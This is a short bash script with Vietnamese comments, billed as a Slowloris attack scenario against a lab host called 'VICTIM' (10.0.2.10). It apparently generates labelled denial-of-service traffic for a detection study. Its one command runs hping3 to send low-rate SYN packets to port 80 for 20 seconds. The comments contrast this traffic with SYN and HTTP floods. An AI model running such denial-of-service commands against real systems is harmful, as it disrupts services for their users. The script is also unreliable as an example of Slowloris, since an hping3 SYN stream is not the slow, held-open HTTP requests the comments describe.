#!/bin/bash
VICTIM="10.0.2.10"
DURATION=20

echo "Bat dau Slowloris vao $VICTIM trong $DURATION giay..."
# Slowloris = gui cham, giu ket noi mo lau
# Dac diem: TCP, PPS thap (50-200), entropy thap, 1 nguon
# Khac voi SYN flood (PPS > 3000) va HTTP flood (PPS 300-3000)
timeout $DURATION hping3 -S -p 80 -i u10000 $VICTIM
echo "Hoan tat kich ban Slowloris!"